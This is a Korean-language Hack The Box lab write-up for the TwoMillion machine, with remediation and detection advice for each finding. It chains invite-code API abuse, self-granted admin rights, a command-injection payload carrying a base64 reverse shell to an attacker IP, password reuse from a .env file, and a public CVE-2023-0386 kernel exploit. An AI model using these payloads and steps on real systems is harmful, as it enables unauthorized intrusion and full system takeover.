+++
title = "[HTB] TwoMillion"
date = "2026-11-23T17:28:00.000+09:00"
draft = false
summary = "초대 코드 API로 관리자 권한을 얻고, VPN 생성 기능의 명령 주입으로 셸을 딴 뒤, 비밀번호 재사용과 커널 취약점으로 root를 얻었다."
tags = [ "HTB" ]
series = []
post_template = "htb"

[htb]
machine = "TwoMillion"
url = "https://app.hackthebox.com/machines/TwoMillion"
os = "Linux"
difficulty = "Easy"
time = ""
+++

## 요약

옛 HackTheBox 사이트의 초대 코드 가입 기능이 그대로 남아 있는 머신이다. 초대 코드를 발급하는 엔드포인트를 분석해 계정을 만들고 로그인한 뒤, 노출된 관리자용 API를 살펴봤다. 사용자 설정 변경 API에 값을 직접 넣어 내 계정을 관리자로 올렸고, 관리자만 쓰는 VPN 생성 기능이 사용자 이름을 `shell_exec`에 그대로 넣는 점을 이용해 명령 주입으로 웹 서버 셸을 얻었다. 웹 디렉터리의 `.env`에 있던 DB 비밀번호가 `admin` 계정의 SSH 비밀번호와 같아 일반 사용자로 넘어갔고, 패치되지 않은 커널의 OverlayFS 취약점(CVE-2023-0386)으로 root 권한까지 얻었다.

## 발견한 취약점

| ID | 취약점 | 위험도 | 위치 | 대응 요약 |
| --- | --- | --- | --- | --- |
| V-01 | 노출된 관리자 API + `is_admin` 값 주입을 통한 권한 상승 | High | `PUT /api/v1/admin/settings/update` | 관리자 API 접근 통제 분리, `is_admin`을 사용자 입력으로 변경 금지 |
| V-02 | 사용자 이름 파라미터를 통한 OS 명령 주입 | High | `POST /api/v1/admin/vpn/generate` | `shell_exec` 제거, 인자 이스케이프, 입력 검증 |
| V-03 | 평문 저장된 DB 비밀번호의 SSH 재사용 | High | `/var/www/html/.env`, SSH 22/tcp | 계정별 고유 비밀번호, 비밀정보 분리 저장 |
| V-04 | 패치되지 않은 커널의 지역 권한 상승 (OverlayFS) | High | Linux 5.15.70, CVE-2023-0386 | 커널 업데이트 |

## 수행 과정

### 1. 정보 수집 (Reconnaissance)

#### 포트 스캔

```shell
nmap -p- -n -T4 --min-rate 1000 10.129.229.66
nmap -p 22,80 -sC -sV 10.129.229.66
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Hack The Box :: Penetration Testing Labs
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| 포트 | 서비스 | 버전 | 메모 |
| --- | --- | --- | --- |
| 22/tcp | ssh | OpenSSH 8.9p1 | 자격 증명이 생기면 시도 (보류) |
| 80/tcp | http | nginx | `2million.htb`로 리다이렉트 → hosts 등록 |

80 포트가 `2million.htb`로 리다이렉트하므로 `/etc/hosts`에 등록했다.

#### HTTP

접속하면 옛 HackTheBox 메인 페이지가 나온다. `Join`을 누르면 `/invite`로 이동해 초대 코드 입력 화면이 뜬다. 바로 가입하는 폼이 아니라 초대 코드를 먼저 요구하길래, 사이트를 Burp Suite 프록시로 거쳐 둘러보고 Target의 Site map에서 구조를 확인했다. `js` 폴더 아래에 `inviteapi.min.js`가 보여, 그 URL을 브라우저에 직접 넣어 열었다.

열어 보니 `inviteapi.min.js`는 `eval(function(p,a,c,k,e,d){...})` 형태로 난독화돼 있었다. 초대 코드 입력 폼은 이 스크립트를 거쳐 `/api/v1/invite/verify`로 코드를 POST한다.

![](/images/htb/20261123-171944.png)

여기까지 알아낸 것:

- 가입에 초대 코드가 필요하고, 검증은 `/api/v1/invite/verify`로 이뤄진다
- 세션 쿠키가 `PHPSESSID`라서 백엔드는 PHP다
- 초대 코드 생성 로직이 클라이언트 JS에 숨어 있을 가능성이 높다
- 보류: SSH (자격 증명이 생기면 시도)

### 2. 초기 침투 (Initial Access)

#### 난독화된 JS에서 초대 코드 발급 엔드포인트 찾기

`inviteapi.min.js`의 난독화는 packer 방식이라 [de4js](https://lelinhtinh.github.io/de4js/) 같은 도구로 바로 풀린다.

![](/images/htb/20261123-171845.png)

복원하면 `verifyInviteCode()`와 `makeInviteCode()` 두 함수가 나온다. `makeInviteCode()`가 `/api/v1/invite/how/to/generate`로 POST를 보내는데, 코드 생성 방법을 알려 주는 엔드포인트로 보여 직접 호출했다.

```shell
curl -sX POST http://2million.htb/api/v1/invite/how/to/generate | jq
```

```json
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}
```

ROT13을 풀면 `In order to generate the invite code, make a POST request to /api/v1/invite/generate`가 된다. 안내된 경로대로 코드 발급을 요청했다.

```shell
curl -sX POST http://2million.htb/api/v1/invite/generate | jq
```

```json
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "SUM4VzctUVFMVzQtVVNMUUktUUE2R1U",
    "format": "encoded"
  }
}
```

`format`이 encoded라서 Base64로 디코드하면 실제 초대 코드가 나온다.

```shell
echo 'SUM4VzctUVFMVzQtVVNMUUktUUE2R1U' | base64 -d
# IC8W7-QQLW4-USLQI-QA6GU
```

이 코드를 `/invite`에 넣으면 `/register`로 넘어가며 코드가 자동으로 채워진다. 임의의 사용자 이름과 비밀번호로 가입한 뒤 로그인했다.

> 핵심 판단: 초대 코드는 `how/to/generate`로 방법을 받고 `generate`로 발급받는, 공개된 두 번의 요청으로 그대로 나온다.

#### 로그인 후 노출된 관리자 API 열거

로그인하면 `/home`으로 이동한다. 메뉴 대부분은 동작하지 않고, `Access` 페이지에서만 VPN 설정 파일을 받을 수 있다. BurpSuite로 `Connection Pack` 버튼을 눌러 보니 `GET /api/v1/user/vpn/generate`를 호출했다. 별도의 API 서버가 있다는 뜻이라 `/api`를 요청했다.

```shell
curl -s 2million.htb/api --cookie "PHPSESSID=3rm0k1vnfi7s6nc9jkb4kiiuel" | jq
# {"/api/v1": "Version 1 of the API"}

curl -s 2million.htb/api/v1 --cookie "PHPSESSID=3rm0k1vnfi7s6nc9jkb4kiiuel" | jq
```

`/api/v1`은 전체 라우트 목록을 반환했고, 그 안에 `admin` 전용 엔드포인트가 그대로 노출돼 있었다.

![](/images/htb/20261123-172018.png)

`/admin/auth`로 현재 권한을 확인하니 `{"message": false}`가 돌아왔다. 아직 관리자가 아니라 다른 API를 통해 권한 상승을 해야 한다.

여기까지 알아낸 것:

- `PUT /api/v1/admin/settings/update` 로 사용자 설정을 바꿀 수 있다
- `POST /api/v1/admin/vpn/generate` 는 관리자만 쓰는 VPN 생성 기능이다
- 보류: VPN 생성 기능은 관리자가 되기 전엔 못 쓴다 → 먼저 관리자 권한을 얻어야 한다

#### 설정 변경 API로 스스로 관리자 승격

`/admin/settings/update`를 PUT으로 호출하니 401이 아니라 `{"status":"danger","message":"Invalid content type."}`가 돌아왔다. 권한을 막지 않고 입력 형식만 지적하길래, 오류 메시지를 따라 필요한 파라미터를 하나씩 채웠다.

| 시도 | 응답 | 알게 된 점 |
| --- | --- | --- |
| 쿠키만 보냄 | `Invalid content type.` | JSON 본문을 요구한다 |
| `Content-Type: application/json` 추가 | `Missing parameter: email` | `email` 필요 |
| `email` 추가 | `Missing parameter: is_admin` | `is_admin` 필요 |
| `is_admin: 1` | 내 계정 정보 + `"is_admin": 1` 반환 | 승격 성공 |

```shell
curl -X PUT http://2million.htb/api/v1/admin/settings/update \
  --cookie "PHPSESSID=3rm0k1vnfi7s6nc9jkb4kiiuel" \
  --header "Content-Type: application/json" \
  --data '{"email":"test@test.com", "is_admin": 1}' | jq
```

```json
{
  "id": 13,
  "username": "test",
  "is_admin": 1
}
```

`/admin/auth`를 다시 호출하니 `{"message": true}`가 돌아왔다. 관리자가 됐으니 정보 수집에서 보류했던 VPN 생성 기능을 이제 쓸 수 있다.

> 핵심 판단: `is_admin` 값을 서버가 판단하지 않고 요청 본문에서 그대로 받아 내 계정에 반영했다.

#### 관리자 VPN 생성 기능의 명령 주입

관리자가 됐으니 `/admin/vpn/generate`를 호출했다. `username`을 받아 그 사용자용 VPN 설정 파일을 만들어 돌려주는 기능이다. 관리자 전용이라 입력 검증이 허술할 수 있고, 내부에서 `exec`나 `system` 계열로 셸을 거친다면 명령 주입이 통한다. `username`에 `;id;`를 붙여 확인했다.

```shell
curl -sX POST http://2million.htb/api/v1/admin/vpn/generate \
  --cookie "PHPSESSID=3rm0k1vnfi7s6nc9jkb4kiiuel" \
  --header "Content-Type: application/json" \
  --data '{"username":"test;id;"}'
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

명령이 실행됐다. 리스너를 열고 리버스 셸을 받았다.

```shell
# 공격자 측
nc -lvp 1234
```

리버스 셸 페이로드는 공백과 특수문자가 깨지지 않게 Base64로 감싸 보냈다.

```shell
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
  --cookie "PHPSESSID=3rm0k1vnfi7s6nc9jkb4kiiuel" \
  --header "Content-Type: application/json" \
  --data '{"username":"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC54LzEyMzQgMD4mMQ== | base64 -d | bash;"}'
```
![](/images/htb/20261123-172246.png)

현재 위치: 대상 호스트의 웹 서버 계정 `www-data`

### 3. 수평 이동 (Lateral Movement)

#### 웹 디렉터리 `.env`의 DB 비밀번호를 SSH에 재사용

웹 디렉터리의 `.env`에서 DB 자격 증명을 찾았다.

```text
www-data@2million:~/html$ cat .env
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

`/etc/passwd`에 실제로 `admin`이라는 로그인 셸 계정이 있었다.

```shell
admin:x:1000:1000::/home/admin:/bin/bash
```

DB 사용자 이름이 `admin`인데 시스템에도 같은 이름의 계정이 있어, 비밀번호 재사용을 의심했다. 정보 수집에서 보류해 둔 SSH에 이 비밀번호를 그대로 넣어 봤다.

```shell
ssh admin@2million.htb
```

![](/images/htb/20261123-172328.png)

현재 위치: 대상 호스트의 일반 사용자 `admin` (user 플래그는 `/home/admin`에 있다.)

> 핵심 판단: `.env`의 DB 비밀번호와 `admin` 계정의 SSH 비밀번호가 같았다.

### 4. 권한 상승 (Privilege Escalation)

#### 메일함의 단서 → 커널 OverlayFS 취약점(CVE-2023-0386)

사용자 메일을 확인하니 커널을 빨리 패치하라는 내용이 있었고, OverlayFS/FUSE 취약점을 콕 집어 언급했다.

```text
admin@2million:/var/mail$ cat admin
...
Date: Tue, 1 June 2023 10:45:22 -0700
...
Hey admin,

I'm know you're working as fast as you can to do the DB migration.
While we're partially down, can you also upgrade the OS on our web host?
There have been a few serious Linux kernel CVEs already this year.
That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

"OverlayFS/FUSE"와 날짜를 단서로 CVE-2023-0386을 찾았다. [우분투 공지](https://ubuntu.com/security/CVE-2023-0386)와 비교해서 영향받는 커널 버전인지 먼저 확인했다.

```shell
uname -a
# Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
lsb_release -a
# Ubuntu 22.04.2 LTS (jammy)
```

`jammy`의 패치 버전은 5.15.0-70.77까지인데 머신은 5.15.70을 쓰고 있어 취약하다고 판단했다. 공개 PoC를 받아 빌드하고 실행했다.

```shell
git clone https://github.com/puckiestyle/CVE-2023-0386
# 로컬에서 대상 호스트로 전송 (scp) 후
cd /tmp/CVE-2023-0386
make all
# 터미널 1
./fuse ./ovlcap/lower ./gc &
# 터미널 2
./exp
```
![](/images/htb/20261123-172356.png)

현재 위치: 대상 호스트의 `root` (root 플래그는 `/root`에 있다.)

## 취약점 상세

### V-01. 노출된 관리자 API와 `is_admin` 값 주입을 통한 권한 상승

| 항목 | 내용 |
| --- | --- |
| 위험도 | High |
| CVSS 3.1 | 8.8 `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| 분류 | CWE-862 (접근 통제 누락), CWE-639 (사용자 제어 키를 통한 권한 우회) |
| 위치 | `PUT /api/v1/admin/settings/update` (`AdminController.php`의 `update_settings`) |

**원인**

`update_settings`는 `is_admin($router)`의 반환값으로 관리자 여부를 판단한다. 그런데 이 함수는 불리언이 아니라 `{"message": true}`나 `{"message": false}` 같은 JSON 문자열을 반환한다. `if (!$is_admin)` 검사는 문자열이 비어 있지 않으면 통과하므로, 관리자가 아니어도 접근이 막히지 않는다. 게다가 바꿀 `is_admin` 값을 요청 본문에서 그대로 받아 `UPDATE users SET is_admin = ? WHERE email = ?`에 넣는다. (공식 Appendix의 `AdminController.php` 소스 확인)

**재현 절차**

1. 유효한 초대 코드로 일반 계정을 만들고 로그인한다.
2. 아래 요청을 보낸다.

```http
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
Content-Type: application/json
Cookie: PHPSESSID=[세션]

{"email":"[내 이메일]","is_admin":1}
```

3. `GET /api/v1/admin/auth` 응답이 `{"message": true}`로 바뀌는지 확인한다.

**영향**

가입만 할 수 있으면 누구나 자기 계정을 관리자로 승격함. 관리자 전용 기능(VPN 생성 등) 전체에 접근 가능해짐.

**대응 방안**

- 즉시 조치: `update_settings`의 권한 검사를 `is_admin()` 반환 JSON이 아니라 세션의 실제 관리자 플래그로 엄격 비교하도록 수정함 (`$_SESSION['is_admin'] === 1`).
- 근본 조치: 권한 판정 함수가 출력(JSON)과 판정(불리언)을 섞지 않게 분리함. 권한 상승 가능한 필드(`is_admin`)는 사용자 입력으로 변경할 수 없게 하고, 관리자 API는 네트워크와 인증 경계로 분리함.
- 조치 확인: 일반 계정으로 같은 PUT 요청을 보냈을 때 401이 반환되고, `is_admin`이 바뀌지 않아야 함.

**탐지**

접근 로그에서 일반 사용자 세션이 `/api/v1/admin/*`를 호출하는 요청, 특히 `settings/update`에 `is_admin`이 담긴 PUT이 흔적으로 남음. DB 감사 로그에는 사용자 본인이 자신의 `is_admin`을 1로 바꾸는 UPDATE가 찍힘.

### V-02. 사용자 이름 파라미터를 통한 OS 명령 주입

| 항목 | 내용 |
| --- | --- |
| 위험도 | High |
| CVSS 3.1 | 7.2 `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| 분류 | CWE-78 (OS 명령 주입) |
| 위치 | `POST /api/v1/admin/vpn/generate` (`VPNController.php`의 `admin_vpn`) |

**원인**

`admin_vpn`은 사용자 이름을 검증 없이 셸 명령에 그대로 이어 붙인다. VPN 재생성 쪽(`regenerate_user_vpn`)에는 입력 정리가 있지만, 파일을 읽어 출력하는 부분은 `shell_exec("/usr/bin/cat /var/www/html/VPN/user/$username.ovpn")`로 `$username`을 직접 쓴다. (공식 Appendix의 `VPNController.php` 소스 확인)

**재현 절차**

1. V-01로 관리자 권한을 얻는다.
2. `{"username":"test;id;"}`를 본문으로 `POST /api/v1/admin/vpn/generate`를 보낸다.
3. 응답에 `uid=33(www-data) ...`가 섞여 나오는지 확인한다.

**영향**

웹 서버 계정(`www-data`) 권한으로 임의 명령 실행. 리버스 셸로 대화형 접근 확보.

**대응 방안**

- 즉시 조치: `shell_exec`로 `cat`을 호출하지 않고 PHP의 파일 읽기(`file_get_contents`)로 대체함. 불가피하면 `escapeshellarg($username)`로 인자를 이스케이프함.
- 근본 조치: 사용자 이름을 허용 문자(영숫자)로 화이트리스트 검증함. 관리자 기능이라도 입력을 신뢰하지 않음.
- 조치 확인: `{"username":"test;id;"}` 요청이 명령을 실행하지 않고, `test;id;.ovpn` 파일을 찾지 못했다는 결과만 반환해야 함.

**탐지**

웹 접근 로그에 `username` 값으로 `;`, `|`, `` ` ``, `$()`가 든 요청이 남음. 웹 서버 프로세스가 `cat` 외에 `bash`나 `nc` 같은 자식 프로세스를 실행하는지 감사하면 드러남.

### V-03. 평문 저장된 DB 비밀번호의 SSH 재사용

| 항목 | 내용 |
| --- | --- |
| 위험도 | High |
| CVSS 3.1 | 8.3 `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L` |
| 분류 | CWE-256 (평문 자격 증명 저장), CWE-521 (취약한 비밀번호 재사용) |
| 위치 | `/var/www/html/.env`, SSH 22/tcp (`admin` 계정) |

**원인**

웹 애플리케이션의 `.env`에 DB 비밀번호가 평문으로 들어 있고, 같은 값이 시스템 `admin` 계정의 SSH 비밀번호로 재사용됨. 웹 셸을 얻은 공격자가 바로 OS 계정으로 넘어감.

**재현 절차**

1. V-02로 `www-data` 셸을 얻는다.
2. `/var/www/html/.env`를 읽어 `DB_PASSWORD`를 확보한다.
3. `ssh admin@2million.htb`에 같은 비밀번호를 넣어 로그인되는지 확인한다.

**영향**

웹 서버 계정에서 로그인 가능한 일반 사용자 계정으로 수평 이동. user 플래그 획득.

**대응 방안**

- 즉시 조치: `admin` 계정의 SSH 비밀번호를 `.env` 값과 다른 고유 값으로 교체함. 가능하면 비밀번호 로그인을 끄고 공개키 인증만 허용함.
- 근본 조치: 애플리케이션 비밀정보를 소스 디렉터리의 평문 파일 대신 접근이 제한된 비밀 관리 수단(환경 변수 주입, 비밀 관리 서비스)으로 옮김. DB 계정과 OS 계정의 자격 증명을 분리함.
- 조치 확인: `.env`의 값으로는 SSH 로그인이 실패해야 함.

**탐지**

웹 셸 활동 직후 같은 비밀번호로 성공하는 SSH 로그인이 `/var/log/auth.log`에 남음. `.env` 같은 비밀 파일에 대한 비정상적 읽기 접근도 흔적이 됨.

### V-04. 패치되지 않은 커널의 지역 권한 상승 (CVE-2023-0386)

| 항목 | 내용 |
| --- | --- |
| 위험도 | High |
| CVSS 3.1 | 7.8 `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| 분류 | CWE-269 부적절한 권한 관리 (OverlayFS SetUID 파일 복사 처리 결함) |
| 위치 | Linux 커널 5.15.70 (OverlaySFS/FUSE) |
| CVE | CVE-2023-0386 |

**원인**

Linux 커널 OverlayFS가 하위 계층의 SetUID 파일을 상위로 복사할 때 소유권과 권한을 제대로 검증하지 않아, 일반 사용자가 nobody 소유의 SetUID 바이너리를 통해 root로 실행할 수 있음. 머신은 `jammy` 패치 버전(5.15.0-70.77 이하 영향)에 해당하는 5.15.70을 쓰고 있어 취약함.

**재현 절차**

1. 일반 사용자(`admin`) 셸에서 PoC를 빌드한다 (`make all`).
2. `./fuse ./ovlcap/lower ./gc &`를 백그라운드로 실행한다.
3. `./exp`를 실행해 root 셸을 얻는다.

**영향**

로컬 일반 사용자가 root 권한 획득. 시스템 완전 장악.

**대응 방안**

- 즉시 조치: 영향받지 않는 커널로 업데이트하고 재부팅함 (`apt upgrade`로 `jammy` 보안 패치 적용).
- 근본 조치: 정기 커널 패치 관리 체계를 두고, 비권한 사용자의 OverlayFS/FUSE 사용이 필요 없다면 `unprivileged_userns_clone` 등으로 공격면을 줄임.
- 조치 확인: 패치 후 같은 PoC가 권한 상승에 실패해야 함(`uname -r`이 패치 버전).

**탐지**

일반 사용자가 FUSE나 OverlayFS 마운트를 호출하거나 `/tmp`에서 SetUID 바이너리를 만들고 실행하면 흔적이 됨. auditd로 `mount`와 `setuid` 관련 시스템콜을 감시하면 드러남.

## 배운 점

### 새로 알게 된 것

- V-01의 핵심은 PHP의 타입 처리였다. `is_admin()`이 불리언이 아니라 `{"message": false}` 같은 JSON 문자열을 돌려주는데, PHP에서는 비어 있지 않은 문자열을 참으로 본다. 그래서 `if (!$is_admin)`의 `!$is_admin`이 거짓이 되고, 차단하려던 블록을 건너뛴다. 권한 검사를 무력화한 건 복잡한 우회가 아니라 함수가 불리언 대신 문자열을 반환한 것 하나였다.
- V-02는 같은 입력이라도 경로마다 검증이 다르면 뚫린다는 사례다. 공격자가 넣은 `username`은 두 함수를 거치는데, VPN 재생성 쪽은 위험한 문자를 걸러내지만 파일 내용을 출력하는 `shell_exec` 쪽은 그대로 쓴다. 한쪽만 막으면 검증 안 한 다른 경로로 명령 주입이 된다. (이 부분은 아직 완전히 소화하지 못해서 소스를 다시 보며 정리할 생각이다.)
- 권한 상승 단서가 사용자 메일에 있을 수 있다는 걸 처음 알았다. `/var/mail/admin`에 관리자에게 온 메일이 있었고, OverlayFS/FUSE 커널 취약점을 패치하라는 내용이 그대로 권한 상승 힌트였다.

### 막혔던 지점

- 권한 상승 단계에서 가장 오래 막혔다. 메일에 힌트가 있는 줄 몰라서 다른 경로를 한참 뒤지다가, 공식 라이트업을 보고 `/var/mail`을 확인해야 한다는 걸 알고 풀었다.

### 다음 머신에서 떠올려 볼 것

점검 목록에 더해 둘 것들이다. 정해진 순서라기보다, 막혔을 때 떠올릴 후보에 가깝다.

- 권한 상승이 막히면 `/var/mail`과 사용자 메일함도 들여다본다. 이번처럼 힌트가 메일에 들어 있기도 하다.
- 웹 서비스라면 로그인 뒤에 `/api`, `/api/v1` 같은 API 루트도 찔러 본다. 숨은 엔드포인트나 라우트 목록이 그대로 나오기도 한다.
- 설정 파일에서 비밀번호를 찾으면 그 값을 `/etc/passwd`의 로그인 계정에 재사용해 본다.

## 참고 자료

- [CVE-2023-0386 (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-0386) — 커널 OverlayFS 권한 상승 상세
- [xkaneiki/CVE-2023-0386 (GitHub)](https://github.com/puckiestyle/CVE-2023-0386) — V-04에 사용한 PoC
- [de4js](https://lelinhtinh.github.io/de4js/) — `inviteapi.min.js` 난독화 해제
- [FIRST CVSS 3.1 계산기](https://www.first.org/cvss/calculator/3.1) — 위험도 벡터 산정
- [HTB TwoMillion 공식 라이트업](https://app.hackthebox.com/machines/TwoMillion) — 권한 상승 단계에서 막혀 `/var/mail` 힌트를 확인하는 데 참고
